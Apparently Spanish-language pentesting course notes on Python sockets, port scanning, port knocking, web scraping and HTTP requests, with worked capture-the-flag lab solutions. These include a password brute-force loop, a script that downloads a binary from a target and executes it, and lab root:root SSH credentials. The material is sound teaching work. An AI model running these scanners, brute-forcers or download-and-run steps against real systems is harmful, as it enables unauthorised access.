server.listen(2) # Wait for a client connection. Only 2 clients can connect to the server
print('Server is listening for incoming connections')

while True:
    conn, address = server.accept() # Establish the connection with the client
    print("Connection Received from %s" % str(addr))
    msg = 'Connection Established'+ "\r\n"
    conn.send(msg.encode('ascii'))
```

En la lista anterior, usamos el nuevo socket *conn* de conexión para enviar el texto "Conexión establecida" al cliente una vez que se conecta al servidor.

Ya casi hemos completado nuestro servidor. La última funcionalidad que agregaremos es la capacidad de cerrar el socket desde el lado del servidor con *socket.close()*.

```
#!/usr/bin/python3
#server.py

import socket 

host = socket.gethostname()
port = 8080
     
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((host,port))
server.listen(2)
print('Server is listening for incoming connections')
     
while True:
    conn,addr = server.accept()
    print("Connection Received from %s" % str(addr))
    msg = 'Connection Established'+ "\r\n"
    conn.send(msg.encode('ascii'))
    conn.close()
```

Observe cómo cerramos el conector de conexión y no el conector del *servidor* original, para permitir que nuestro servidor siga funcionando y acepte más conexiones.

Resumamos lo que hemos aprendido. Después de crear un nuevo socket, usamos el método *socket.bind()*, que vincula el programa a una dirección IP y un puerto específicos. Esto permite que el servidor escuche las solicitudes entrantes. Para asegurarnos de que el servidor esté escuchando estas solicitudes, usamos el método *socket.listen()* . Una vez que el cliente ha solicitado conectarse, usamos el método *socket.accept()* para aceptar la conexión y el método *socket.send()* para enviar un mensaje al cliente. Finalmente, invocamos *socket.close()* para terminar la conexión.

Una vez escrito el script, guardaremos el programa de Python como server.py .

<br />

**Exercises**

**3. Este es un desafío de secuencias de comandos. Primero, asegúrese de que su servidor pueda aceptar al menos cuatro conexiones a la vez. Luego, use SSH para iniciar sesión en el contenedor que se ejecuta en el puerto 2004 de la máquina virtual de destino con las credenciales root:root. Ejecute el binario ubicado en /root para volver a conectarse a su servidor y recibir la bandera.**

El código emepleado es:

```python
#!/usr/bin/python3
#server.py

import socket 
     
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(("192.168.49.66", 8080))
server.listen(4)
print('Server is listening for incoming connections')
     
while True:
    conn,addr = server.accept()
    print("Connection Received from %s" % str(addr))
    msg = 'Connection Established'+ "\r\n"
    conn.send(msg.encode('ascii'))
    
    try:
        print(conn.recv(1024).decode())
    except:
        conn.close()
    conn.close()
```






































#### 4.3. Escribir un PortScanner en Python.

En esta unidad de aprendizaje, vamos a construir un escáner de puerto simple utilizando las librerias de *socket* y *time*. El escaneo de puertos nos permite ubicar puertos abiertos que están disponibles en un host en particular. Como pentesters, podemos configurar nuestro escáner de puertos para recuperar información sobre los puertos, evaluar qué servicios se están ejecutando en cada puerto e incluso adivinar qué sistema operativo se está ejecutando en el host.

Comenzaremos nuestro script importando los módulos relevantes e invocando el método *time.time()*.

```
#!/usr/bin/python3
#scanner.py

import socket
import time

startTime = time.time()
```

El método *time.time()* devuelve la hora a la que el intérprete de Python ejecuta la línea de código en la que se encuentra. Usamos este método para almacenar el tiempo inicial de ejecución del programa en la variable *startTime*.

Al final del script, usaremos *time.time()* una vez más para almacenar el tiempo futuro en otra variable (*endTime*). Al restar el valor de *endTime* de *startTime*, podemos calcular cuánto tarda el programa en completar su ejecución total.

A continuación, permitiremos que el usuario especifique qué objetivo desea escanear a través del input. Luego usamos *socket.gethostbyname()* para convertir el nombre de host proporcionado en una dirección IP.

```
#!/usr/bin/python3
#scanner.py

import socket
import time

startTime = time.time()

target = input('Please specify the host that you want to scan: ')
target_IP = socket.gethostbyname(target)
print ('Initiating Scan for host: ', target_IP)
```

Alternativamente, podríamos omitir la línea que comienza con "target_IP" y simplemente permitir que el usuario proporcione una dirección IP como entrada en lugar de un nombre de host.

Cuando ejecuta su escaneo contra la máquina de ejercicios, es posible que desee ajustar esta parte del guión.

A continuación, emplearemos un ciclo *for* para determinar qué puertos queremos escanear en nuestro objetivo. En lugar del método familiar *socket.connect()*, usaremos *socket.connect_ex()* para iniciar la conexión. *socket.connect_ex()* hace lo mismo que *socket.connect()* , pero devuelve un indicador de error en caso de éxito o fracaso. En particular, devolverá 0 cuando se ejecute con éxito. Esto significa que cuando este método devuelve 0, sabemos que el puerto específico que estábamos escaneando en ese momento estaba abierto.

```
#!/usr/bin/python3
#scanner.py

import socket
import time

startTime = time.time()

target = input('Please specify the host that you want to scan: ')
target_IP = socket.gethostbyname(target)
print ('Initiating Scan for host: ', target_IP)
     
for i in range(1, 1000):
    scanner = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn = scanner.connect_ex((target_IP, i))
    if(conn == 0):
        print ('Port %d: OPEN' %(i))
    scanner.close()
```

En el ciclo *for*, estamos iterando sobre los puertos 1 a 1000. Podemos cambiar fácilmente estos valores, o mejor aún, permitir que el usuario especifique qué puertos desea escanear a través de argumentos de línea de comando. Dejaremos más mejoras al guión como ejercicio para el lector.

Finalmente, simplemente necesitamos ejecutar *time.time()* nuevamente y calcular cuánto tiempo lleva el escaneo, como se describe anteriormente.

```
#!/usr/bin/python3
#scanner.py

import socket
import time

startTime = time.time()

target = input('Please specify the host that you want to scan: ')
target_IP = socket.gethostbyname(target)
print ('Initiating Scan for host: ', target_IP)
     
for i in range(1, 1000):
    scanner = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn = scanner.connect_ex((target_IP, i))
    if(conn == 0):
        print ('Port %d: OPEN' %(i))#El %d expone la variable indicada con posterioridad en decimal.
    scanner.close()

endTime = time.time()
totalTime = endTime - startTime
print('Total Time: %s' %(totalTime))
```

Ejecutar el script nos pedirá que ingresemos un nombre de host y realizará el escaneo de puertos. El script debería generar un resultado similar al siguiente.

```
kali@kali:~$ python3 scanner.py                             
Please specify the host that you want to scan: localhost
Initiating Scan for host:  127.0.0.1
Port 22: OPEN
Port 80: OPEN
Port 8080: OPEN
Total Time: 3.3422038555145264
```

En el ejemplo anterior, especificamos *localhost* como el objetivo para escanear. Dado que el script usa el método *socket.gethostbyname()*, nos permite especificar el nombre de host IPv4 de una máquina y recuperar su dirección IP. Como actualización, localhost generalmente se resuelve en la dirección IP de loopback, 127.0.0.1.

Descubrimos que tenemos tres puertos escuchando en nuestra máquina virtual local y que el script tardó aproximadamente 3,34 segundos en ejecutarse de principio a fin. Podemos expandir este script brindándole un medio para recorrer una lista de hosts mediante la creación de bucles _for_ anidados , o haciendo que envíe diferentes tipos de paquetes a los hosts a los que se conecta.

<br />

**Exercises**

**1. Vuelva a crear el escáner de puertos en esta sección. Luego, apunte a los puertos 3000 a 3999 de la máquina virtual de destino. En orden numérico, ¿qué puertos están abiertos? Ingrese su respuesta en el siguiente formato: WWWW, XXXX, YYYY, ZZZZ**

El script empleado es:

```python
#!/usr/bin/python3
#scanner.py

import socket
import time
import sys

if len(sys.argv) != 4:
    print("[!] This script works with the IP, starting port and end port respectively as parameters.")
    exit(1)

startTime = time.time() #Este parámetro recoge el tiempo actual.
target = sys.argv[1] #Este parámetro asocia a la variable target el primer parámtero con el que se pasa el stream.
target_IP = socket.gethostbyname(target)
print ('[+] Initiating Scan for host: ', target_IP)
     
for i in range(int(sys.argv[2]), int(sys.argv[3])): #Se toma para el escaneo los números pasados como segundo y tercer parámetros del script.
    scanner = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn = scanner.connect_ex((target_IP, i)) #Empleamos el connext_ex() method para interpretar a partir del código de error del mismo el estado del puerto escaneado.
    if(conn == 0):
        print ('[+] -> Port %d: OPEN' %(i))#El %d expone la variable indicada con posterioridad en decimal.
    scanner.close()

endTime = time.time()#Guardamos en la variable endtime el tiempo transcurrido y lo restamos al startTime para obtener el tiempo de duración del scaner.
totalTime = endTime - startTime
print('[+] Total Time: %s' %(totalTime))

```

<br />

**Port Knoking**

*Port Knocking* es un medio por el cual los usuarios externos pueden abrir un puerto cerrado en una máquina conectándose primero a una lista predeterminada de otros puertos en un orden específico. Piense en ello como ingresar un PIN en un dispositivo móvil: si ingresa los números correctos en el orden correcto, el teléfono se desbloqueará. De manera similar, suponiendo que el firewall de la máquina se haya configurado de tal manera, "tocar" los puertos correctos en el orden correcto abrirá el puerto cerrado.

Una implementación de *Port Knocking* puede agregar una capa de seguridad pequeña pero no despreciable a un sistema, porque evita escaneos de puertos como el que hemos ejecutado anteriormente. Dado que el escaneo de puertos iterará a través de un bucle, es muy poco probable que el firewall esté configurado para abrir el puerto cerrado según las reglas exactas que sigue nuestro escaneo. Un usuario externo primero deberá tener un conocimiento profundo del sistema, antes de poder conectarse al servicio cerrado.

Las reglas del port knocking se pueden hacer arbitrariamente complejas, lo que aumenta el requesito del conocimiento del sistema requerido por el usuario externo. Tenga en cuenta, sin embargo, que la activación de puertos por sí sola no es un sistema de seguridad suficiente, ya que se basa en la seguridad por oscuridad. Se puede comparar con la autenticación de un solo factor, que representa algo que el usuario conoce como el único medio de autenticación. En este caso, lo que el usuario sabe es el orden de los puertos para golpear.

<br />

**Exercise**

**1. Modifique su escáner de puertos para que golpee con precisión y en orden numérico los ocho puertos que tienen números Pronic en el rango de 4000 a 4999. Es posible que deba buscar la definición de "número Pronic" para determinar qué puertos escanear. Una vez que haya realizado la secuencia de activación del puerto, use las credenciales Aristotle:Lyceum para SSH al puerto recién abierto 2222. ¿Cuál es la bandera en el escritorio del usuario?**

En primer lugar debemos saber que los números prónicos son aquellos que forman parte de la serie definida por la operación 'n(n+1)' donde n es un número natural.

De esta forma, con un sencillo script podemos ver que los números prónicos comprendidos entre el 4000 y el 5000 son aquellos que se corresponden con una n en el rango \[63 - 70\]

```python
cat portknocking.py 
#!/usr/bin/python3

import sys

n = int(sys.argv[1])

for i in range(1,n):
    print(str(i) + " " + str(i*(i+1)))
```

<br />

```bash
./portknocking.py 100 | grep -E ' 4'
#6 42
#20 420
#21 462
63 4032
64 4160
65 4290
66 4422
67 4556
68 4692
69 4830
70 4970
```

De esta forma reutilizamos el escaner de puertos y añadimos una pequeña variación para escane puertos identificados por números prónicos:

```python
#!/usr/bin/python3
#scanner.py

import socket
import time
import sys

if len(sys.argv) != 4:
    print("[!] This script works with the IP, starting port and end port respectively as parameters.")
    exit(1)

startTime = time.time()
target = sys.argv[1]
target_IP = socket.gethostbyname(target)
print ('[+] Initiating Scan for host: ', target_IP)
     
for i in range(int(sys.argv[2]), int(sys.argv[3])):
    scanner = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    j = i*(i+1) # MODIFICACIÓN
    print(str(j))
    conn = scanner.connect_ex((target_IP, j)) # MODIFICACIÓN
    if(conn == 0):
        print ('[+] -> Port %d: OPEN' %(i))#El %d expone la variable indicada con posterioridad en decimal.
    scanner.close()

endTime = time.time()
totalTime = endTime - startTime
print('[+] Total Time: %s' %(totalTime))
```

<br />

```bash
./scanner.py 192.168.66.68 63 71   
[+] Initiating Scan for host:  192.168.66.68
4032
4160
4290
4422
4556
4692
4830
4970
[+] Total Time: 0.905632495880127
```

<br />

#### 4.4. Interacción Web con Python.

**Sockets con HTTP**

Imagine que hemos identificado un servidor web como nuestro objetivo y necesitamos aprender más sobre el servicio. En esta situación, podemos crear un script con Python que enviará solicitudes HTTP a nuestro servidor web para analizar cómo responde. Esta técnica es muy útil porque podemos aprender más sobre el servidor web y cómo se comunica con nuestro cliente, y evaluar si es vulnerable a algún exploit del que tengamos conocimiento.

En esta sección, usaremos el módulo de *socket* nuevamente para crear una conexión TCP sin procesar a un servidor web que se ejecuta en el puerto 80. Dado que estamos usando una conexión de socket sin procesar, debemos proporcionar la solicitud HTTP específica que se enviará al servidor.

El módulo de socket opera en el equivalente de la capa de transporte de los modelos de referencia de red OSI o TCP/IP. Por lo tanto, debemos encapsular los datos del protocolo de la capa de aplicación (es decir, HTTP) que queremos enviar a través de la capa de transporte.

Comenzaremos nuestro script importando el módulo de socket y definiendo un host y un puerto remotos.

```
#!/usr/bin/python3
#http-sockets.py

import socket

remote_host = "www.offensive-security.com"
remote_port = 80
```

Llamamos a nuestro script http-sockets.py. Tenga en cuenta que no podemos llamar al script http.py porque Python tiene un módulo integrado con el mismo nombre.

A continuación, almacenemos la solicitud HTTP que queremos hacer al servidor dentro de una variable, a la que llamaremos acertadamente *request*. Para obtener más detalles sobre el formato de una solicitud HTTP, consulte el tema Conceptos básicos de aplicaciones web.

```
#!/usr/bin/python3
#http-sockets.py

import socket

remote_host = "www.offensive-security.com"
remote_port = 80

request = "GET / HTTP/1.1\r\nHost: www.offensive-security.com\r\n\r\n"
```

Necesitamos especificar la solicitud exacta que queremos que nuestro servidor envíe al servidor, por lo que debemos incluir la sintaxis precisa y las nuevas líneas ("\\r\\n") que espera HTTP.

La siguiente parte del script es similar a la creación de un cliente de Python. Inicializaremos un socket y luego lo usaremos para conectarnos al servidor. Una vez que estemos conectados, usaremos *socket.send()* para realizar nuestra solicitud, usando nuestra variable de *request*.

```
#!/usr/bin/python3
#http-sockets.py

import socket

remote_host = "www.offensive-security.com"
remote_port = 80

request = "GET / HTTP/1.1\r\nHost: www.offensive-security.com\r\n\r\n"

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((remote_host,remote_port))
client.send(request.encode())
```

Finalmente, queremos captar la respuesta que nos envía el servidor, así que usaremos el método *socket.recv(bytes)* y luego la decodificaremos e imprimiremos.

```
#!/usr/bin/python3
#http-sockets.py

import socket

remote_host = "www.offensive-security.com"
remote_port = 80

request = "GET / HTTP/1.1\r\nHost: www.offensive-security.com\r\n\r\n"

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((remote_host,remote_port))
client.send(request.encode())

response = client.recv(4096)
print(response.decode())
```

Es importante tener en cuenta que el método *send()* requiere un argumento de objeto similar a un byte, no una cadena. Podemos usar el método *encode()* en una variable para convertir su contenido en bytes y usar el método *decode()* para convertir bytes en una cadena.

Como se mencionó anteriormente, el método *recv()* se usa para recibir la respuesta del servidor. Este método requiere un argumento, que es el número máximo de datos en bytes que se recibirán.

<br  />

**GET Requests with Python**

Python nos permite comunicarnos directamente a través de HTTP en lugar de abrir sockets de red sin procesar. En esta sección, importaremos la librería *requests* para crear una solicitud HTTP GET y mostrar la respuesta.

Comencemos nuestro script importando el módulo de *requests* y definiendo una URL de destino a la que queremos enviar una solicitud.

```
#!/usr/bin/python3
#web-client.py

import requests

url = "http://www.offensive-security.com"
```

A continuación, emplearemos nuestro primer método de solicitudes, *request.get()*. Este método realizará una solicitud HTTP a la URL proporcionada como argumento y devolverá un objeto *response*. El objeto de *response* se puede analizar y formatear de varias maneras.

```
#!/usr/bin/python3
#web-client.py

import requests

url = "http://www.offensive-security.com"

response = requests.get(url)
print(response.content.decode())
```

En la lista anterior, usamos el método *Requests.content()* para leer el contenido del objeto *response* en bytes. Pasamos la salida al método *decode()* y la imprimimos, para que podamos verla en texto sin formato.

Este script básico se puede modificar en una variedad de formas que nos permiten extraer la información precisa que estamos buscando de un servidor web.

Durante una fase de reconocimiento de una prueba de penetración (por ejemplo), es posible que solo nos interese determinar el código de estado de las distintas páginas. El método *Requests.status_code()* extrae el código de estado de la respuesta del objeto *Response*.

```
#!/usr/bin/python3
#web-client.py

import requests

url = "http://www.offensive-security.com/doesnotexist.html"

response = requests.get(url)
print(response.status_code)
```

Como repaso, los códigos de estado se agrupan en las siguientes clases:

-   Código 100-199: Respuestas informativas
-   Código 200-299: Respuestas exitosas
-   Código 300-399: redirecciones
-   Código 400-499: errores del cliente
-   Código 500-599: Errores del servidor

Cuando se ejecute el script, obtendremos el código de estado de la URL que hemos especificado. La URL que solicitamos es www.offensive-security.com/doesnotexist.html . Dado que esta página no existe, el servidor responderá con un código de estado de error del cliente (404).

A continuación, modifiquemos el script para devolver solo los encabezados de respuesta del servidor. Podemos hacer esto con el método *Requests.headers()*. Podemos analizar los encabezados para comprender mejor el servidor web y cómo interactúa con los clientes.

```
#!/usr/bin/python3
#web-client.py

import requests

url = "http://www.offensive-security.com"

response = requests.get(url)
print(response.headers)
```

En esta iteración del script, enviamos una solicitud a http://www.offensive-security.com e imprimimos los encabezados de respuesta que recibimos del servidor.

Finalmente, el método *Requests.text()* nos permite imprimir la respuesta completa en Unicode.

```
#!/usr/bin/python3
#web-client.py

import requests

url = "http://www.offensive-security.com"

response = requests.get(url)
print(response.text)
```

Este script realiza una solicitud simple a http://www.offensive-security.com e imprime la respuesta. Recuerde que las requests.content() deben usarse cuando el servidor entrega datos en formato binario y requests.text() cuando entrega datos textuales.

<br />

**Parsing HTML. Web Scraping.**

Si ha utilizado los métodos *requests.content()* o *requests.text()* anteriores, es probable que haya descubierto que la respuesta puede contener una cantidad significativa de datos HTML. A veces, es posible que deseemos obtener información específica de un sitio sin todo el desorden que implica una respuesta completa. 

El *Web Scraping* es un proceso de barrido de la información contenida en una página web y la extracción de la información que nos interesa. Como pentester, a veces es más fácil recuperar los datos que estamos buscando escribiendo un script que tratando de buscar el datos manualmente desde el sitio web.

Comencemos usando el módulo *urllib3* para enviar una solicitud HTTP que obtendrá los datos de la página web. La biblioteca de *requests* utiliza la librería *urllib3* pero en este caso, lo importaremos explícitamente solo para que podamos familiarizarnos con la sintaxis diferente.

```
#!/usr/bin/python3
#parse.py

import urllib3

http = urllib3.PoolManager()

url = 'http://www.megacorpone.com'

response = http.request('GET', url)
print(response.data.decode('utf-8'))
```

Aquí, creamos una variable llamada *http* que llama al módulo *urllib3* y usamos el método *PoolManager* para ordenar los resultados desordenados. Luego, la variable *url* se usa para llamar al sitio web al que estamos enviando una solicitud HTTP. Podemos cambiar la variable *url* para especificar otros dominios o direcciones IP.

La secuencia de comandos anterior imprimirá la salida del sitio web de destino en el terminal, pero se mostrará como código HTML sin formato. Avancemos y ejecutemos el script, y pasemos el resultado al comando head para cortarlo.

```
kali@kali:~$ python3 parse.py | head -n 20
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="shortcut icon" href="assets/ico/favicon.ico">

    <title>MegaCorp One - Nanotechnology Is the Future</title>

    <!-- Bootstrap core CSS -->
    <link href="assets/css/bootstrap.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <link href="assets/css/style.css" rel="stylesheet">
    <link href="assets/css/font-awesome.min.css" rel="stylesheet">
```

Para que los datos sean más fáciles de leer, podemos usar otro módulo llamado *BeautifulSoup*. Este módulo toma los archivos HTML y XML sin procesar de la librería urlopen y extrae los datos para ayudar a analizar la información que hemos recuperado de la página web.

Podemos incluir nuestro nuevo módulo modificando nuestro script de la siguiente manera.

```
#!/usr/bin/python3
#parse.py

import urllib3
from urllib.request import urlopen
from bs4 import BeautifulSoup

url = urlopen("http://www.megacorpone.com")

page = url.read()
soup = BeautifulSoup(page, features="html.parser")

print(soup)
```

En la lista anterior, importamos dos bibliotecas de *urllib3* y *bs4*. La libreria *urlopen* nos permite recuperar los datos sin procesar devueltos por el servidor. La biblioteca _beautifulsoup_ es responsable del análisis real de la salida.

```
<!DOCTYPE html>

<html lang="en">
<head>
<meta charset="utf-8"/>
<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
<meta content="width=device-width, initial-scale=1" name="viewport"/>
<meta content="" name="description"/>
<meta content="" name="author"/>
<link href="assets/ico/favicon.ico" rel="shortcut icon"/>
<title>MegaCorp One - Nanotechnology Is the Future</title>
<!-- Bootstrap core CSS -->
<link href="assets/css/bootstrap.css" rel="stylesheet"/>
<!-- Custom styles for this template -->
<link href="assets/css/style.css" rel="stylesheet"/>
<link href="assets/css/font-awesome.min.css" rel="stylesheet"/>
<!-- Just for debugging purposes. Don't actually copy this line! -->
<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image IE.png' | relative_url }}" text-align="center"/>
</div>
<!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
<!--[if lt IE 9]>
```

Si bien el resultado de la lista anterior no es más legible que el resultado proporcionado por el script original, BeautifulSoup tiene muchos métodos que podemos usar para reducir, clasificar y mostrar el texto deseado. Por ejemplo, el método de *text* imprimirá solo el contenido textual de la página web. Los siguientes ejercicios le permiten flexibilizar su capacidad para recopilar datos específicos de un servidor web.

<br />

**Exercises**

**1. El sitio web en el puerto 8080 de la máquina virtual de destino tiene varias páginas en el directorio /crawling. Usa tus habilidades de Python para GET el contenido en todas las páginas y encuentra la bandera.**

```python
#!/usr/bin/python3

import requests
from bs4 import BeautifulSoup

response = requests.get("http://192.168.66.68:8080/crawling/")
soup = BeautifulSoup(response.text, 'lxml') #En este caso, cargamos la respuesta en texto sobre el parseador de HTML; lxml.

for i in range(1,len(soup.pre.contents)): #Seguidamente formamos el objeto 'soup.pre.contents', el cual nos ofrece los contenidos del elemento HTML <pre> enlistados. 
    if (i % 2) != 0:# Por cuestion de estructuración de la lista, trabajamos con aquellos elementos impares.
        
        tag = str(soup.pre.contents[i])# Lo transformamos a tipo string para poder filtrar el fragmento que nos interesa.
        start = tag.index("/crawling")
        end = tag.index("\" ")#Una vez hemos filtrado el fragmento que nos interesa que consiste en el nombre de la página dentro de /crawling, realizmaos las requests a esas páginas y parseamos el contenido hasta dar con la flag.

        responseFlag = requests.get("http://192.168.66.68:8080"+tag[start:end])
        soupFlag = BeautifulSoup(responseFlag.text, 'lxml')

        if str(soupFlag.pre) != "None":
            print(soupFlag.pre.contents[0])
```

<br />

**2. Visite el sitio web en el puerto 8080 de la máquina virtual de destino en el directorio /table. La tabla que se encuentra en la página contiene la bandera, pero cada fila contiene una letra diferente. Use Python para realizar una solicitud a esta página y analizar la respuesta.**

```python
#!/usr/bin/python3

import requests
from bs4 import BeautifulSoup

response = requests.get("http://192.168.66.68:8080/table")
soup = BeautifulSoup(response.text, 'lxml')

Chunk = ""
Flag = ""
String = ""
for i in range(1, len(soup.tbody.contents)):#Desplegamos todo el contenido de la Flag y lo agrupamos en un string.
    if (i % 2) != 0:
        Chunk += str(soup.tbody.contents[i])

Chunk1 = Chunk.replace('<td>','')
Chunk2 = Chunk1.replace('</td>','')
Chunk3 = Chunk2.replace('<tr>','')
Chunk4 = Chunk3.replace('</tr>','')
Flag = Chunk4.replace('\n','')
print(Flag) #Quitamos los elementos ajenos a los caracteres de la flag e imprimos el resto.
```

<br />

**POST Requests and Parameters with Python**

El módulo *requests* también nos permite enviar datos a un servidor a través de una *POST-request*. En una solicitud POST, los datos que se envían al servidor se almacenan en el cuerpo de la solicitud de una solicitud HTTP. Esto contrasta con una solicitud GET, donde los datos se envían directamente a través de una URL (esto hace además que dichos datos sean fácilmente visibles, así la POST request es preferible a la GET request cuando por ejemplo se está realizando una petición de logeo o cosas similares). Un caso de uso común para las solicitudes POST empleadas por muchos sitios web son los formularios web, como los que se usan al suscribirse a un sitio.

Examinemos un script que hará una solicitud POST y luego devolverá la respuesta del servidor.

```python
#!/usr/bin/python3
#web-client2.py

import requests

url = 'http://www.offensive-security.com'

info = {'check-key': 'check-value'}
post = requests.post(url, data = info)
print(post.text)
```

El script en la lista anterior envía una solicitud a www.offensive-security.com y envía los datos contenidos en la variable de *información*. Una vez enviados los datos, se imprimirá la respuesta en forma de texto.

Hay otros métodos HTTP que podemos usar en nuestros scripts de Python como *PUT*, *DELETE*, *HEAD*, y *OPTIONS* para interactuar con el servidor web. Lo alentamos a que experimente escribiendo guiones para cada uno de estos.

<br />

**Exercises**

**1. La página en el puerto 8080 del servidor de destino llamada /basic-post solo acepta solicitudes POST. Realice cualquier solicitud POST a la página para recibir la bandera.**

```python
#!/usr/bin/python3

import requests

post = requests.post('http://192.168.66.68:8080/basic-post/', data = {'offsec': 'hello'})#Observemos la barra final en basic-post/, sin esta la URL no sería interpretada correctamente como POST.

print(post.text)
```

<br />

**2. You can authenticate to page at port 8080 of the target server called /login-1 with the username 'thobbes' and the password 'leviathan'. Make a POST request to the page with the above credentials to get the flag.**

```python
#!/usr/bin/python3

import requests

post = requests.post('http://192.168.66.68:8080/login-1/', data = {'username': 'thobbes', 'password': 'leviathan'})

print(post.text)
```

<br />

**3. Puede autenticarse en la página del puerto 8080 del servidor de destino llamado /login-2 con el nombre de usuario 'rdescartes' y la contraseña 'discourse'... sin embargo, ¡la contraseña va seguida de cinco caracteres! @ # % & en algún orden desconocido. Por ejemplo, la contraseña podría ser discurso#!@&%, o podría ser discurso%&@!#. Use Python para recorrer todas las solicitudes POST posibles para determinar la contraseña e inicie sesión para obtener el indicador.**

```python
#!/usr/bin/python3

import requests
import random

myList = ["!","@","#","%","&"]

while True:
    random.shuffle(myList)#Esto cambia aleatoriamente el orden de la lista anterior premitiéndonos así probar con todas las posibles variaciones.
    password = "discourse"+''.join(myList)#Adherimos todos los elementos de la lista ya variada a 
    post = requests.post('http://192.168.114.68:8080/login-2/', data = {'username': 'rdescartes', 'password': password})
    
    if 'OS{' in post.text:
        print(post.text)
        print("[+] Credentials are: "+password)
        break 
    else:
        print("[!] "+password+" is not valid.")
```

<br />

**4.  La página en el puerto 8080 del servidor de destino llamada /bijection acepta un valor entero que corresponde a la posición de la letra de la bandera. Por ejemplo:**

-   /bijection?index=0 devolverá el carácter 'O'
-   /bijection?index=1 devolverá el carácter 'S'
-   /bijection?index=2 devolverá el carácter '{'

**Use sus habilidades de Python para crear un script que obtenga la bandera completa. Tenga en cuenta que la página solo aceptará solicitudes POST.**

```python
#!/usr/bin/python3

import requests
from bs4 import BeautifulSoup
i = 0
Flag = ""

while True:
    response = requests.post('http://192.168.114.68:8080/bijection/', data = {'index': i})
    soup = BeautifulSoup(response.text, 'lxml')#Realizamos una request y filtramos la respuesta por un parseador HTML.
    i += 1
    charFlag = str(str(soup.body.div.contents[0].replace('\n','')).replace(' ',''))
#Aislamos el caracter de la Flag en cada respuesta primero obteniendo un campo de contexto reducido que incluya dicho caracter con body.div y retirando con replace espacios y saltos de línea.
    if charFlag != "}":
        Flag += charFlag
    else:
        Flag += charFlag
        break

print(Flag)
```

<br />

**Encabezados HTTP**

Un *HTTP header* permite que el cliente y el servidor pasen información adicional en la solicitud o la respuesta HTTP que estos intercambian. El encabezado consta de un nombre que no distingue entre mayúsculas y minúsculas seguido de un punto y coma (:) y luego un valor. Un *Request Header* contiene información detallada sobre el recurso que se está consultando. Un *Response Header* contiene información adicional sobre la respuesta. Por ejemplo, un encabezado de respuesta podría incluir la ubicación del servidor.

Uno de los encabezados más importantes que debemos conocer es el *Content-Type*. Este encabezado se utiliza para indicar el tipo de medio original del recurso.

En la respuesta, el Content-Type de contenido le dice al cliente qué tipo de contenido se mostrará.

Para que podamos identificar el tipo de contenido del servidor, debemos enviar una solicitud específica al servidor y hacer que la respuesta muestre la salida de los encabezados HTTP. El siguiente script realiza una solicitud GET a www.offensive-security.com e imprime los encabezados HTTP de la respuesta.

```
#!/usr/bin/python3
#headers.py

import requests

url = "http://www.offensive-security.com"
response = requests.get(url)
print(response.headers)
```

El servidor responderá con el siguiente resultado.

```
{'Server': 'Sucuri/Cloudproxy', 'Date': 'Wed, 09 Jun 2021 02:32:42 GMT', 'Content-Type': 'text/html; charset=UTF-8', 'Content-Length': '14838', 'Connection': 'keep-alive', 'X-Sucuri-ID': '17005', 'X-XSS-Protection': '1; mode=block', 'X-Frame-Options': 'SAMEORIGIN', 'X-Content-Type-Options': 'nosniff', 'Strict-Transport-Security': 'max-age=31536000; includeSubdomains; preload', 'Content-Security-Policy': 'upgrade-insecure-requests;', 'Link': '<https://www.offensive-security.com/>; rel=shortlink', 'Vary': 'Accept-Encoding,User-Agent', 'Content-Encoding': 'gzip', 'X-Sucuri-Cache': 'HIT'}
```

En la lista anterior, el _'Tipo de contenido': 'text/html; charset=UTF-8'_ indica que la página mostrará la información en formato de texto/html. Tenga en cuenta que el tipo de contenido siempre cambiará según la solicitud enviada al servidor.

<br />

**Exercises**

**1. El directorio en el puerto 8080 del servidor de destino llamado /headers tiene diez subpáginas llamadas /headers/1 a /headers/10. Cada página tiene un encabezado personalizado llamado "Flag" que contiene una parte de la bandera. Usa Python para juntar todos los componentes de la Flag.**


```python
#!/usr/bin/python3
import requests

Flag = ""
for i in range(1,11):
    response = requests.get('http://192.168.114.68:8080/headers/'+str(i))
    chunk = str(response.headers)
    chunkList = list(chunk.split(","))
    Flag += chunkList[3].replace('\'Flag\':','').replace('\'','').replace(' ','')

print(Flag)
```

<br />

**2. La página en el puerto 8080 del servidor de destino llamado /objeto devuelve un binario que, cuando se ejecuta, imprime la bandera. Use python para guardar el binario y luego ejecútelo para obtener la bandera.**

```python
#!/usr/bin/python3
import requests
import subprocess

print('[+] Creating file.')
file = open('code.bin','x')#Creamos un fichero para guardar el binario.
file = open("code.bin",'wb') # vamos a escribir en binario (wb).

print("[+] File created and open. Writing Content.")
response = requests.get('http://192.168.114.68:8080/object')
file.write(response.content)#Realizamos la request y escribimos el contenido sobre el fichero abierto anteriormente y lo cerramos.

print("[+] File writed with the binary. CLosing file.")
file.close()

print("[+] Executing binary.")#Seguidamente, utilizamos el modulo 'subprocess'para ejecutar un comando que corra el binario.
subprocess.call("chmod +x /home/kali/code.bin; /home/kali/code.bin", shell=True)

print("[+] Finish. Cleaning enviroment.")
subprocess.call("rm /home/kali/code.bin", shell=True)#Finalmente, con los contenidos desplegados borramos el código del binario pues ya no nos hace falta.
```

<br />

**3. La página en el puerto 8080 del servidor de destino llamada /about.html contiene una lista de 30 empleados, sus direcciones de correo electrónico y sus colores favoritos. Solo uno de estos usuarios puede iniciar sesión en la página en /login-3. Utilice Python para determinar qué usuario tiene una cuenta válida analizando las respuestas a sus solicitudes. ¿Cuál es el nombre del usuario válido?**
En primer lugar acudimos al sitio web y observamos que el logeo se realiza mediante el email. Además, la página contiene una vulnerabilidad de leak-information pues especifica que el usuario no es correcto:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230115174440.png' | relative_url }}" text-align="center"/>
</div>

